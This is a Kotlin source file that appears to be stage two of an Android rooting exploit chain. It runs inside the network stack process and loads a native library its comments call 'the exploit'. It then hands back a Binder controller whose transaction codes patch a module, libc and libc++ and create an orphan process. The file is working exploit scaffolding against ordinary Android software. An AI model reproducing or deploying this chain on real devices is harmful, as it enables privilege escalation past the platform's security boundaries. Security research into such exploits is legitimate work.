package dev.busung.s25uroot.dfr.stage2

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Binder
import android.os.Bundle
import android.os.Parcel
import android.os.RemoteException
import android.util.Log
import org.lsposed.lspromise.DirtyFrag

/**
 * Runs *inside* `com.android.networkstack.process`, after [StageHop] has sent it there.
 *
 * Two things are true here that are not true in system_server, and both are why this hop exists: a
 * library out of this APK can be loaded, and executable memory can be mapped. So this loads `libexp` -
 * the exploit - and hands the process that loaded it back to the UI as a binder, which is the only
 * direction a binder can travel between two processes this far apart.
 *
 * The load is reported rather than fatal. On an ABI the library was not built for (the artifact is
 * arm64-only), or a device where the mapping is refused, the Java hop itself is still provable from
 * this log - which is worth separating from the exploit not working.
 */
class StageReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.i(TAG, "stage 2 entered network_stack")
        try {
            stageTwo(context)
        } catch (error: Throwable) {
            Log.e(TAG, "stage 2 failed", error)
        }
        Log.i(TAG, StageHop.cleanupLoadedApk(context))
    }

    private fun stageTwo(context: Context) {
        try {
            System.loadLibrary("exp")
        } catch (error: UnsatisfiedLinkError) {
            Log.e(TAG, "libexp could not be loaded (built for another ABI?): $error")
            return
        }
        val controller = object : Binder() {
            override fun onTransact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
                try {
                    when (code) {
                        // One code per step of the exploit, and one that runs them in order. They are
                        // separate because a run that stops at step three says which step refused, and
                        // that is the whole diagnosis.
                        CODE_PATCH_MODULE -> reply?.writeInt(DirtyFrag.patchMod())
                        CODE_PATCH_LIBC -> reply?.writeInt(DirtyFrag.patchLibc())
                        CODE_PATCH_CXX -> reply?.writeInt(DirtyFrag.patchCxx())
                        CODE_ORPHAN -> reply?.writeInt(DirtyFrag.createOrphanProcess())
                        CODE_RUN_ALL -> {
                            val reporter = data.readStrongBinder()
                            reply?.writeInt(DirtyFrag(reporter).runAll())
                        }
                        else -> return super.onTransact(code, data, reply, flags)
                    }
                    return true
                } catch (error: RemoteException) {
                    throw error
                } catch (error: Throwable) {
                    Log.e(TAG, "controller call $code failed", error)
                }
                return super.onTransact(code, data, reply, flags)
            }
        }

        context.sendBroadcast(
            Intent().apply {
                setPackage(context.packageName)
                action = EVIL_ACTION
                putExtras(Bundle().apply { putBinder(CONTROLLER, controller) })
            },
        )
        Log.i(TAG, "controller handed back to the UI process")
    }

    companion object {
        const val TAG = "RMGStage2"

        /**
         * The channel the controller comes back on.
         *
         * Named after the id this APK installs under rather than typed out, because the receiver on the
         * other end registers a filter built from the same value - and two literals that have to agree
         * are two literals that can drift.
         */
        val EVIL_ACTION: String get() = "${BuildConfig.APPLICATION_ID}.CONTROLLER"

        const val CONTROLLER = "CONTROLLER"

        private const val CODE_PATCH_MODULE = 1
        private const val CODE_PATCH_LIBC = 2
        private const val CODE_PATCH_CXX = 3
        private const val CODE_ORPHAN = 4
        private const val CODE_RUN_ALL = 5
    }
}
